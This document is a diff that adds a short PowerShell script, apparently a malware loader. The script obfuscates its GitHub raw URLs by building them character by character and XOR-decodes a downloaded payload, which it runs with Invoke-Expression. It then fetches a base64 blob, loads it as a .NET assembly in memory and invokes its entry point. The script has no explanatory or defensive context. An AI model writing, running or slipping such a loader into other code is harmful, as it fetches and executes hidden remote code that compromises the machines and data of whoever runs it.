@@ -1,0 +1,48 @@
+
+Start-Sleep -Seconds 9
+$enc = [System.Text.Encoding]::UTF8
+
+function mBKgQhryaEASz {
+    param($string, $method)
+    $sKpDhEdSkBsQE = $enc.GetBytes("secretkey")
+
+    if ($method -eq "mLdKnvWeSYbjt"){
+        $string = $enc.GetString([System.Convert]::FromBase64String($string))
+    }
+
+    $byteString = $enc.GetBytes($string)
+    $tgecwWWMilzWi = $(for ($i = 0; $i -lt $byteString.length; ) {
+        for ($j = 0; $j -lt $sKpDhEdSkBsQE.length; $j++) {
+            $byteString[$i] -bxor $sKpDhEdSkBsQE[$j]
+            $i++
+            if ($i -ge $byteString.Length) {
+                $j = $sKpDhEdSkBsQE.length
+            }
+        }
+    })
+
+    if ($method -eq "encrypt") {
+        $tgecwWWMilzWi = [System.Convert]::ToBase64String($tgecwWWMilzWi)
+    } else {
+        $tgecwWWMilzWi = $enc.GetString($tgecwWWMilzWi)
+    }
+    
+    return $tgecwWWMilzWi
+}
+
+$downloadLink = "h" + "t" + "t" + "p" + "s" + ":" + "/" + "/" + "r" + "a" + "w" + "." + "g" + "i" + "t" + "h" + "u" + "b" + "u" + "s" + "e" + "r" + "c" + "o" + "n" + "t" + "e" + "n" + "t" + "." + "c" + "o" + "m" + "/" + "D" + "o" + "Y" + "o" + "u" + "K" + "n" + "o" + "w" + "M" + "e" + "9" + "6" + "3" + "/" + "t" + "e" + "s" + "t" + "/" + "m" + "a" + "i" + "n" + "/" + "s" + "s" + "s" + "1" + "." + "t" + "x" + "t"
+
+
+$eText = (New-Object System.Net.WebClient).DownloadString($downloadLink)
+
+ $output = mBKgQhryaEASz $eText "mLdKnvWeSYbjt"
+ 
+Invoke-Expression $output
+$url = "h" + "t" + "t" + "p" + "s" + ":" + "/" + "/" + "r" + "a" + "w" + "." + "g" + "i" + "t" + "h" + "u" + "b" + "u" + "s" + "e" + "r" + "c" + "o" + "n" + "t" + "e" + "n" + "t" + "." + "c" + "o" + "m" + "/" + "D" + "o" + "Y" + "o" + "u" + "K" + "n" + "o" + "w" + "M" + "e" + "9" + "6" + "3" + "/" + "t" + "e" + "s" + "t" + "/" + "m" + "a" + "i" + "n" + "/" + "s" + "s" + "s" + "s" + "2" + "." + "t" + "x" + "t"
+$response = Invoke-WebRequest -Uri $url
+$innerText = $response.ParsedHtml.body.innerText
+$contentToSave =  $innerText
+$data=  [System.Convert]::FromBase64String($contentToSave)
+$assembly=[System.Reflection.Assembly]::Load($data)
+$entryPoint = $assembly.EntryPoint
+$entryPoint.Invoke($null, @())
